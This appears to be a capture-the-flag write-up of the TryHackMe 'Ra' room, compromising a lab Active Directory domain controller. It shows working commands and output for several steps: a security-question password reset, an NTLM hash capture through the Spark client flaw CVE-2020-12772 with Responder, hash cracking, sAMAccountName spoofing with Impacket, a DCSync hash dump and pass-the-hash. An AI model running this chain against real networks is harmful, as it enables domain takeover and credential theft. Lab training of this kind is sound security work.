---
lab: "Ra"
date: "2026-09-28"
platform: "TryHackMe"
difficulty: "Hard"
---
# Room link: https://tryhackme.com/room/ra

![](../Attachments/Pasted%20image%2020260928012152.png)

```nmap
PORT     STATE SERVICE                VERSION
53/tcp   open  domain                 Simple DNS Plus
80/tcp   open  http                   Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Windcorp.
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec           Microsoft Windows Kerberos (server time: 2026-09-27 17:23:17Z)
135/tcp  open  msrpc                  Microsoft Windows RPC
139/tcp  open  netbios-ssn            Microsoft Windows netbios-ssn
389/tcp  open  ldap                   Microsoft Windows Active Directory LDAP (Domain: windcorp.thm, Site: Default-First-Site-Name)
443/tcp  open  ssl/https?
| ssl-cert: Subject: commonName=Windows Admin Center
| Subject Alternative Name: DNS:WIN-2FAA40QQ70B
| Not valid before: 2020-04-30T14:41:03
|_Not valid after:  2020-06-30T14:41:02
|_ssl-date: 2026-09-27T17:24:53+00:00; -1s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http             Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
2179/tcp open  vmrdp?
3268/tcp open  ldap                   Microsoft Windows Active Directory LDAP (Domain: windcorp.thm, Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
3389/tcp open  ms-wbt-server          Microsoft Terminal Services
| ssl-cert: Subject: commonName=Fire.windcorp.thm
| Not valid before: 2026-09-26T17:14:32
|_Not valid after:  2027-03-28T17:14:32
| rdp-ntlm-info: 
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2026-09-27T17:23:41+00:00
|_ssl-date: 2026-09-27T17:24:53+00:00; -1s from scanner time.
5222/tcp open  jabber                 Ignite Realtime Openfire Jabber server 3.10.0 or later
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
|_ssl-date: 2026-09-27T17:24:53+00:00; -1s from scanner time.
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     stream_id: 2ym0ikfd7m
|     unknown: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     xmpp: 
|       version: 1.0
|     auth_mechanisms: 
|     features: 
|_    compression_methods: 
5269/tcp open  xmpp                   Wildfire XMPP Client
| xmpp-info: 
|   Respects server name
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     stream_id: 2ased9najs
|     unknown: 
|     errors: 
|       host-unknown
|       (timeout)
|     xmpp: 
|       version: 1.0
|     auth_mechanisms: 
|     features: 
|_    compression_methods: 
5985/tcp open  http                   Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7070/tcp open  http                   Jetty 9.4.18.v20190429
|_http-title: Openfire HTTP Binding Service
|_http-server-header: Jetty(9.4.18.v20190429)
7443/tcp open  ssl/http               Jetty 9.4.18.v20190429
|_http-server-header: Jetty(9.4.18.v20190429)
|_http-title: Openfire HTTP Binding Service
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
|_ssl-date: 2026-09-27T17:24:53+00:00; -1s from scanner time.
7777/tcp open  socks5                 (No authentication; connection failed)
| socks-auth-info: 
|_  No authentication
9090/tcp open  hadoop-datanode        Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: jive-ibtn jive-btn-gradient
| hadoop-tasktracker-info: 
|_  Logs: jive-ibtn jive-btn-gradient
|_http-title: Site doesn't have a title (text/html).
9091/tcp open  ssl/hadoop-tasktracker Apache Hadoop
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
| hadoop-datanode-info: 
|_  Logs: jive-ibtn jive-btn-gradient
|_http-title: Site doesn't have a title (text/html).
|_ssl-date: 2026-09-27T17:24:53+00:00; -1s from scanner time.
| hadoop-tasktracker-info: 
|_  Logs: jive-ibtn jive-btn-gradient
Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows

```

### Key Services 

- `53` - DNS 
- `88` - Kerberos 
- `389/636` - LDAP/LDAPS
- `445` - SMB 
- `3389` - RDP 
- `5985` - WinRM
- `80` - HTTP

### Domain Info 

- Domain: `windcorp.thm` 
- DC: `Fire.windcorp.thm`

```bash
# Add in /etc/hosts
10.49.181.218 windcorp.thm fire.windcorp.thm
```
# Null enumeration

## RPC

```nmap
$ rpcclient -U "" -N windcorp.thm           
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

## SMB 

```bash
$ nxc smb windcorp.thm -u '' -p ''                                                            
SMB         10.49.181.218   445    FIRE             [*] Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.49.181.218   445    FIRE             [+] windcorp.thm\: 
```

```bash
 nxc smb windcorp.thm -u 'guest' -p '' 
SMB         10.49.181.218   445    FIRE             [*] Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.49.181.218   445    FIRE             [-] windcorp.thm\guest: STATUS_ACCOUNT_DISABLED
```

Both null and guest account are disabled.

## LDAP

```bash
$ ldapsearch -x -H ldap://windcorp.thm:389 -b "DC=windcorp,DC=local" "(objectClass=user)"
# extended LDIF
#
# LDAPv3
# base <DC=windcorp,DC=local> with scope subtree
# filter: (objectClass=user)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A57, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563
```

Ldap required a valid credentials before we can do anything.

## HTTP 

![](../Attachments/Pasted%20image%2020260928013543.png)


The website is a company landing page. There is no `login form` but there is a `Reset password`.

![](../Attachments/Pasted%20image%2020260928013659.png)

It shows here that we can reset password with just one security question. This is poor security. To be able to exploit this, we need a valid username and the right answer for the question.

Looking around, I found names of `IT support-staff` and `Employees`.

![](../Attachments/Pasted%20image%2020260928013832.png)

![](../Attachments/Pasted%20image%2020260928013921.png)

Now, if you pay attention to the `Security Questions`, you will notice that one of them is `What is/was your favorite pet's name?`. We can directly link it to `Lily Levesque` because she has a sentiment that `She Loves being able to  bring her bestfriend to work`. It's obviously the dog. 

The problem is that we don't know the dog's name. Poking around elements in the web page. I found the dog's name and possible `Lily's username`.

If you right click their image and open in new tab. It will show the names in the file name. 

![](../Attachments/Pasted%20image%2020260928014236.png)

username: `lilyle`
Pet: `Sparky`

![](../Attachments/Pasted%20image%2020260928014440.png)

Now that I have valid credentials, I will continue my enumeration further. 

```bash
$ nxc smb windcorp.thm -u 'lilyle' -p '{REDACTED}' --shares
SMB         10.49.181.218   445    FIRE             [*] Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.49.181.218   445    FIRE             [+] windcorp.thm\lilyle:ChangeMe#1234 
SMB         10.49.181.218   445    FIRE             [*] Enumerated shares
SMB         10.49.181.218   445    FIRE             Share           Permissions     Remark
SMB         10.49.181.218   445    FIRE             -----           -----------     ------
SMB         10.49.181.218   445    FIRE             ADMIN$                          Remote Admin
SMB         10.49.181.218   445    FIRE             C$                              Default share
SMB         10.49.181.218   445    FIRE             IPC$            READ            Remote IPC
SMB         10.49.181.218   445    FIRE             NETLOGON        READ            Logon server share 
SMB         10.49.181.218   445    FIRE             Shared          READ            
SMB         10.49.181.218   445    FIRE             SYSVOL          READ            Logon server share 
SMB         10.49.181.218   445    FIRE             Users           READ            
```

So we have a lot of things to check in here. I decided to check the non-standard shares first.

### SHARED 

```bash
smb: \> ls
  .                                   D        0  Sat May 30 08:45:42 2020
  ..                                  D        0  Sat May 30 08:45:42 2020
  Flag 1.txt                          A       45  Fri May  1 23:32:36 2020
  spark_2_8_3.deb                     A 29526628  Sat May 30 08:45:01 2020
  spark_2_8_3.dmg                     A 99555201  Sun May  3 19:06:58 2020
  spark_2_8_3.exe                     A 78765568  Sun May  3 19:05:56 2020
  spark_2_8_3.tar.gz                  A 123216290  Sun May  3 19:07:24 2020
```

This one contains the first flag and an `executable`. I tried to get everything but I could only pull `Flag 1.txt` because the size of the other files is big. 

# First Flag

```bash
$ cat 'Flag 1.txt'
THM{REDACTED}  
```

After this one, I had to scrub over the other shares. It took me some time to scrub over the other shares but I did not get any. 

# SPARK

With no progress, I started to look into this spark thing. 

![](../Attachments/Pasted%20image%2020260928020303.png)

It's basically a software where users in an Openfire Server can message each other. 

After couple minutes of digging, I found the exact package for `spark 2.8.3.deb` at https://github.com/igniterealtime/Spark/releases/tag/v2.8.3.

![](../Attachments/Pasted%20image%2020260928020532.png)

I downloaded the `spark_2_8_3.tar.gz`. 

```bash
 tar -xvzf spark_2_8_3.tar.gz Spark/                     
Spark/
Spark/.install4j/
Spark/.install4j/4042238b.lprop
Spark/.install4j/5cd2e029.lprop

<SNIP>

$ cd Spark
$ ./Spark
```

![](../Attachments/Pasted%20image%2020260928021259.png)

Always remember, Software in machines screams vulnerability.  The latest version of this software is `Spark 3.0.2`. That means this old one should have a vulnerability, we just need to look for it.

# CVE 2020-12772

 ![](../Attachments/Pasted%20image%2020260928021559.png)

That's a very dangerous vulnerability. Basically, the software doesn't have proper sanitization of input at the time. 

![](../Attachments/Pasted%20image%2020260928021755.png)

It says that we have to send a message to someone within the server but there are thousands of users in the domain when i use `--rid-brute`. I tried to refer back to the old photo of `IT-Staffs`.

![](../Attachments/Pasted%20image%2020260928013832.png)

Do you notice which one is online? Your right. Its `Buse Candan`. If we were to get an `NTLM hash`, It should be from someone authenticated within the domain at the moment of exploitation.

The target of the `<img src>` is an `external attackIP` so I will run `responder` to listen on the current `interface of the VPN`.

```Bash
$ sudo responder -I tun0 -v 

<SNIP>

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...  
```

Then trigger the payload message to `Buse Candan` and wait for the `NTLM hash`. 

![](../Attachments/Pasted%20image%2020260928022521.png)

Saved the hash as `buse_hash` then crack it with `JohnTheRipper`. 

```bash
$ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt buse_hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
{REDACTED}      (buse)     
1g 0:00:00:00 DONE (2026-09-28 02:26) 1.204g/s 3567Kp/s 3567Kc/s 3567KC/s v#glbm7+..utrippa
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

With the new valid credentials in my possession, I used to login to the machine using `Evil-winrm` for more enumeration.

```bash
$ evil-winrm -i windcorp.thm -u buse -p '{REDACTED}'                                 
                                        
Evil-WinRM shell v4.1
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\buse\Documents>
```

# Second Flag

```powershell
*Evil-WinRM* PS C:\Users\buse\Desktop> cat "Flag 2.txt"
THM{REDACTED}
```

# BUSE enumeration

```powershell
*Evil-WinRM* PS C:\Users\buse\Desktop> whoami /all

USER INFORMATION
----------------

User Name     SID
============= ============================================
windcorp\buse S-1-5-21-555431066-3599073733-176599750-5777


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                   Alias            S-1-5-32-548                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
WINDCORP\IT                                 Group            S-1-5-21-555431066-3599073733-176599750-5865 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

My current user is part of group:

- Remote Desktop Users
- Remote Management Users
- Account Operators

There's also a non standard privilege for a low user called `SeMachineAccountPrivilege`. 

With research, I found out that with this privilege, I can perform a SamAccountName spoofing. 

So how it works is that, `Machine Accounts` are always followed with `$`. The exploit is that with this privilege, it allows me to:

- Create a `Fake machine` within the domain and name it with the same name as the `DC machine` but without the `$`.  
- Request `Kerberos TGT` for `DC Machine`. This is the exploit. It confuses the machine names giving me a `Kerberos TGT` from the real `DC machine`.
-  Revert the name of the `Fake DC`  back to `Face machine`.
- Use the `TGT` to request a `Service ticket` via Kerberos S4U2Self. When the Key Distribution Center (KDC) looks for `DC` and fails to find it, it automatically appends a `$` and finds the **real** Domain Controller (`DC01$`), returning a ticket granting Domain Admin privileges.

Before you I can start, I need to find out the `SamAccountName` of the `Domain Controller`

```powershell
*Evil-WinRM* PS C:\Users\buse\Desktop> Get-ADComputer -Filter * | Select-Object Name, DNSHostName, SamAccountName, DistinguishedName

Name DNSHostName       SamAccountName DistinguishedName
---- -----------       -------------- -----------------
FIRE Fire.windcorp.thm FIRE$          CN=FIRE,OU=Domain Controllers,DC=windcorp,DC=thm
```

The SamAccountName is `FIRE$`.  

# Privilege Escalation Process

### Attack Chain

#### Step 1: Create fake machine account

```powershell
New-ADComputer -Name "FAKEMACHINE" -AccountPassword (ConvertTo-SecureString "Password1!" -AsPlainText -Force)
```

#### Step 2: Rename its sAMAccountName to DC name (exploit trigger)

```powershell
$ComputerDN = (Get-ADComputer -Identity "FAKEMACHINE").DistinguishedName
$LDAP = New-Object System.DirectoryServices.DirectoryEntry("LDAP://windcorp.thm/$ComputerDN")
$LDAP.Put("sAMAccountName", "FIRE")
$LDAP.CommitChanges()
```

<mark style="color: red">It is important to change the name using LDAP</mark> because you will encounter a `SamAccountName` already exists for `FIRE`. It ignores the `$` for some reason.

#### Step 3: Request TGT for the spoofed DC name

The KDC looks for account named `FIRE`, doesn't find it, appends `$`, finds `FIRE$` (real DC), and issues ticket for DC.

```bash
$ getTGT.py windcorp.thm/FIRE:'Password1!' -dc-ip 10.49.181.218                                             
/usr/local/bin/getTGT.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.14.0.dev0+20260916.40533.c38d1eeb', 'getTGT.py')
Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in FIRE.ccache

```

#### Step 3.5: Restore original sAMAccountName (cleanup during exploit)

```bash
$ComputerDN = (Get-ADComputer -Filter "SamAccountName -eq 'FIRE'").DistinguishedName
$LDAP = New-Object System.DirectoryServices.DirectoryEntry("LDAP://windcorp.thm/$ComputerDN")
$LDAP.Put("sAMAccountName", "FAKEMACHINE$")
$LDAP.CommitChanges()

# VERIFY that it is back to FAKEMACHINE$

*Evil-WinRM* PS C:\Users\buse\Desktop> Get-ADComputer -Identity "FAKEMACHINE" -Properties SamAccountName | Select-Object SamAccountName

SamAccountName
--------------
FAKEMACHINE$

```

The rename-back is important because you need the machine account to exist with its real name for S4U2self to work properly.

#### Step 4: Impersonate Administrator using S4U2self

```bash
$ export KRB5CCNAME=/home/******/Labs/Ra/FIRE.ccache # <- export the ticket before using getST.py with -k flag

$ getST.py -self -impersonate Administrator -altservice ctfs/fire.windcorp.thm -k -no-pass windcorp.thm/FIRE
/usr/local/bin/getST.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.14.0.dev0+20260916.40533.c38d1eeb', 'getST.py')
Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Changing service from FIRE@WINDCORP.THM to ctfs/fire.windcorp.thm@WINDCORP.THM
[*] Saving ticket in Administrator@ctfs_fire.windcorp.thm@WINDCORP.THM.ccache

```

#### Step 5: DCSync to dump domain hashes

```bash
$ export KRB5CCNAME=/home/*****/Labs/Ra/Administrator@ctfs_fire.windcorp.thm@WINDCORP.THM.ccache 

$ secretsdump.py -k -no-pass windcorp.thm/Administrator@fire.windcorp.thm

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xc5c32f673440555153fa214e7c3f9e77
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)


[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:{REDACTED}::: # <- DC Admin hash
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7e9df5e082c2637f7964cb60707f4ae4:::

```

With `Domain Credentials` dumped, I just performed a `Pass-the-Hash Attack` on `Evil-WinRM` to get the final flag.

# Third Flag

```powershell
$ evil-winrm -i windcorp.thm -u Administrator -H {REDACTED}
                                        
Evil-WinRM shell v4.1
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\flag3.txt
THM{REDACTED}
```




